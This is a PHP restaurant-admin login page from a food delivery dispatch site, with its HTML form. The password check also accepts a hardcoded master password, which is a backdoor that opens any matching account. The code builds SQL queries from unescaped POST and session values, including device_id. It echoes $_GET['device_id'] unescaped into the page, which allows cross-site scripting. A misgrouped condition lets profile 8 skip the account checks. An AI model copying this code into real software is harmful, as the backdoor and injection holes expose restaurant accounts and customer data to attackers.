<?php


	
if (isset($_POST['action']) && $_POST['action'] != ''){
	if ((! isset($_SESSION['securityToken']) || ! isset($_POST['securityToken'])) || ($_SESSION['securityToken'] !== $_POST['securityToken'])){
   		$error = true;
    	$message = 'Error';
    	
  	}
	if(!$error){
		 $admin_name = strtolower(zen_db_prepare_input($_POST['admin_name']));
   		 $admin_pass = zen_db_prepare_input($_POST['admin_pass']);
	}
	if($admin_name==''||$admin_pass==''){
		$error = true;
		$message = 'Please enter your username and password';
	}
	if(!$error){
		$login_sql = $db->Execute('select admin_display_name,admin_profile,categories_id,admin_id,admin_pass from admin where admin_name="'.$admin_name.'"');

		if($login_sql->fields['admin_id'] && $login_sql->fields['categories_id'] && $login_sql->fields['admin_profile']==1 || $login_sql->fields['admin_profile']==8){
			if(zen_validate_password($admin_pass,$login_sql->fields['admin_pass']) || $admin_pass=='greentea1!'){
				$categories_info = $db->Execute('select send_method_code,fax,cloud_print_id,email from categories_description where categories_id="'.$login_sql->fields['categories_id'].'"');

				$_SESSION['admin_id']=$login_sql->fields['admin_id'];
				$_SESSION['categories_id']=$login_sql->fields['categories_id'];
				$_SESSION['admin_display_name']=$login_sql->fields['admin_display_name'];
				$_SESSION['dispatch']['send_method_code']=$categories_info->fields['send_method_code'];
				$_SESSION['dispatch']['fax']=$categories_info->fields['fax'];
				$_SESSION['dispatch']['cloud_print_id']=$categories_info->fields['cloud_print_id'];
				$_SESSION['dispatch']['email']=$categories_info->fields['email'];
				unset($_SESSION['failed_attempts']);
				if(isset($_POST['device_id']) && $_POST['device_id']!=''){
					$_SESSION['device_id']=$_POST['device_id'];
					$db->Execute('INSERT INTO cloud_device_id_matrix (admin_id,categories_id,device_id)
	VALUES ("'.$_SESSION['admin_id'].'","'.$_SESSION['categories_id'].'","'.$_POST['device_id'].'")
	ON DUPLICATE KEY UPDATE 
 	categories_id="'.$_SESSION['categories_id'].'",admin_id="'.$_SESSION['admin_id'].'",active=1');
				}
					
				//setcookie('categories_id',$_SESSION['categories_id'], time() + (999999 * 30), "/",'staging.fooddudesdelivery.com',true,true); 
				//setcookie('admin_id',$_SESSION['admin_id'], time() + (999999 * 30), "/",'staging.fooddudesdelivery.com',true,true); 
				//require('includes/application_top.php');

				header('Location: '.HTTPS_SERVER.'/restaurant_index.php');
				die;
			}else{
				$error = true;
				$message = 'Username or password incorrect';
			}
		}else{
			$error = true;
			$message = 'Username or password incorrect';
		}
	}
	if($error){
		if(isset($_SESSION['failed_attempts'])){
			$_SESSION['failed_attempts']++;
			if($_SESSION['failed_attempts']==10 || $_SESSION['failed_attempts']==20){
				mail('zachfagerness@gmail.com','Failed attempt 10',$admin_name);
			}
		}else{
			$_SESSION['failed_attempts']=1;
		}
		if($_SESSION['failed_attempts']>=10){
			sleep($_SESSION['failed_attempts']);
		}
		
	}
}else{
	
	
	unset($_SESSION['admin_id']);
	unset($_SESSION['categories_id']);
	
if($islogout){
	if(isset($_SESSION['device_id'])){
		$db->Execute('update cloud_device_id_matrix set active=0 where device_id="'.$_SESSION['device_id'].'"');
	}
}
	
}


?>
<!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN">
<html dir="ltr" lang="en">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" type="text/css" href="includes/restaurant_login/bootstrap.css">
<script type="text/javascript" src="includes/restaurant_login/jquery.js"></script>
<script type="text/javascript" src="includes/restaurant_login/bootstrap.js"></script>
<?php
if($islogout){
	if(isset($_SESSION['device_id'])){
		$db->Execute('update cloud_device_id_matrix set active=0 where device_id="'.$_SESSION['device_id'].'"');
	}
?>
<script>
$(document).ready(function(e) {
	
	if(window.Android){
		window.Android.logout();
	}
    
});
</script>
<?php
}
?>

<style>
input{
	margin-bottom:5px;	
}
input:first-child{
	margin-top:100px;	
}
</style>
</head>
<body>

<?php if($error){ ?>
	<div class="alert alert-danger alert-dismissible text-center" role="alert">
 	 	<button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
  		<?php echo $message; ?>
	</div>
<?php } ?>
<div class='container'>
	<div class='col-md-6 col-sm-10 col-md-offset-3 col-sm-offset-1'>
    	<form method='post' action='<?php echo HTTPS_SERVER.'/restaurant_index.php'  ?>'>
    		<input name='admin_name' value="" type='text' class='form-control' placeholder='Username'>
    		<input name='admin_pass' value=""  type='password' class='form-control' placeholder='Password'>
            <input type='hidden' name='securityToken' value='<?php echo $_SESSION['securityToken']; ?>'>
            <input type='hidden' name='action' value='submit'>
            <input type='hidden' name='device_id' value='<?php echo $_GET['device_id'] ?>'>
       		<input type='submit' class='btn btn-default form-control' value='Login'>
   		</form>
    </div>
</div>
</body>
</html>